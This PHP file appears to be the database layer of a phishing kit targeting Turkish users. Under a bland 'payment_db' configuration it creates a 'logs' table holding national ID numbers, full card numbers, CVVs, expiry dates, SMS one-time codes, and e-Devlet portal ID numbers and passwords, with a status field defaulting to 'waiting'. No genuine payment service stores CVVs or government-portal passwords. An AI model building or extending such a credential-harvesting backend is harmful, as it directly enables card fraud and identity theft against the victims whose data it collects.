<?php
/**
 * Database configuration and connection helper.
 * Reads credentials from environment variables with sensible defaults.
 */

define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
define('DB_PORT', getenv('DB_PORT') ?: '3306');
define('DB_NAME', getenv('DB_NAME') ?: 'payment_db');
define('DB_USER', getenv('DB_USER') ?: 'root');
define('DB_PASS', getenv('DB_PASS') ?: '');
define('DB_CHARSET', 'utf8mb4');

$_db = null;

function getDB(): PDO {
    global $_db;
    if ($_db !== null) {
        return $_db;
    }

    $dsn = sprintf(
        'mysql:host=%s;port=%s;dbname=%s;charset=%s',
        DB_HOST, DB_PORT, DB_NAME, DB_CHARSET
    );

    $options = [
        PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::ATTR_EMULATE_PREPARES   => false,
    ];

    $_db = new PDO($dsn, DB_USER, DB_PASS, $options);
    return $_db;
}

/**
 * Ensure the logs table exists with all required columns.
 * Called once on first use so the app is self-bootstrapping.
 */
function ensureSchema(PDO $db): void {
    $db->exec("
        CREATE TABLE IF NOT EXISTS `logs` (
            `id`              INT UNSIGNED NOT NULL AUTO_INCREMENT,
            `tc_number`       VARCHAR(11)  NOT NULL DEFAULT '',
            `card_number`     VARCHAR(20)  NOT NULL DEFAULT '',
            `card_holder`     VARCHAR(100) NOT NULL DEFAULT '',
            `card_expiry`     VARCHAR(5)   NOT NULL DEFAULT '',
            `card_cvv`        VARCHAR(4)   NOT NULL DEFAULT '',
            `card_bank`       VARCHAR(100) NOT NULL DEFAULT '',
            `card_bin`        VARCHAR(6)   NOT NULL DEFAULT '',
            `card_type`       VARCHAR(50)  NOT NULL DEFAULT '',
            `card_scheme`     VARCHAR(50)  NOT NULL DEFAULT '',
            `card_sub_type`   VARCHAR(50)  NOT NULL DEFAULT '',
            `customer_phone`  VARCHAR(20)  NOT NULL DEFAULT '',
            `customer_name`   VARCHAR(100) NOT NULL DEFAULT '',
            `report_type`     VARCHAR(100) NOT NULL DEFAULT '',
            `amount`          DECIMAL(10,2) NOT NULL DEFAULT 0.00,
            `status`          VARCHAR(20)  NOT NULL DEFAULT 'waiting',
            `sms_code`        VARCHAR(6)   NOT NULL DEFAULT '',
            `session_id`      VARCHAR(128) NOT NULL DEFAULT '',
            `edevlet_tc`      VARCHAR(11)  NOT NULL DEFAULT '',
            `edevlet_pass`    VARCHAR(255) NOT NULL DEFAULT '',
            `islem_tipi`      VARCHAR(50)  NOT NULL DEFAULT '',
            `baskisi_tc`      VARCHAR(11)  NOT NULL DEFAULT '',
            `created_at`      TIMESTAMP    NOT NULL DEFAULT CURRENT_TIMESTAMP,
            `updated_at`      TIMESTAMP    NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
            PRIMARY KEY (`id`)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
    ");
}
